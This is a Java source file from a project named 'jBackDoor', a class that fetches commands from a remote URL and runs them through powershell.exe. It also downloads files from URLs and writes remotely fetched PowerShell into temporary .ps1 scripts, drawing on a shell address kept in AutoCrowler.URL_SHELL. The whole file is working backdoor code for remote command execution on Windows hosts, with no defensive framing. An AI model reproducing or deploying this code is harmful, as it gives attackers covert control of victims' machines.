package jBackDoor.util;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Scanner;
import java.util.UUID;

import jBackDoor.init.AutoCrowler;

public class BasicPowerShellInj {
	// This code inject powershell
	public static void injectFromUrl(String urlShell) throws IOException {
		URL url = new URL(urlShell);
		Scanner s = new Scanner(url.openStream());
		String command = "powershell.exe " + s.nextLine();
		Process child = Runtime.getRuntime().exec(command);
		OutputStream out = child.getOutputStream();
		out.flush();
		out.close();
	}

	public void saveUrl(final String filename, final String urlString)
	        throws MalformedURLException, IOException {
	    BufferedInputStream in = null;
	    FileOutputStream fout = null;
	    try {
	        in = new BufferedInputStream(new URL(urlString).openStream());
	        fout = new FileOutputStream(filename);

	        final byte data[] = new byte[1024];
	        int count;
	        while ((count = in.read(data, 0, 1024)) != -1) {
	            fout.write(data, 0, count);
	        }
	    } finally {
	        if (in != null) {
	            in.close();
	        }
	        if (fout != null) {
	            fout.close();
	        }
	    }
	}

	public static String getCommandFromUrl(String urlShell) throws IOException {
		URL url = new URL(urlShell);
		Scanner s = new Scanner(url.openStream());
		String command = "powershell.exe " + s.nextLine();
		return command;
	}

	public void directInject(String pwshell) throws IOException {
		String command = "powershell.exe " + pwshell;
		Process child = Runtime.getRuntime().exec(command);
		OutputStream out = child.getOutputStream();
		out.flush();
		out.close();
	}

	public static String getPath() {
		File temp = null;
		try {
			temp = File.createTempFile(UUID.randomUUID().toString(), ".ps1");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		String absolutePath = temp.getAbsolutePath();
		String cmd = null;
		try {
			cmd = getCommandFromUrl(AutoCrowler.URL_SHELL);
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			// e1.printStackTrace();
		}

		FileWriter arquivo;

		try {
			arquivo = new FileWriter(temp);
			arquivo.write(cmd);
			arquivo.close();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return absolutePath;
	}

	public static String getAppDataPatch(File temp) {

		String absolutePath = temp.getAbsolutePath();
		String[] split = absolutePath.split("\\\\");
		String[] split2 = absolutePath.split("Local");
		return split2[0];
	}
}
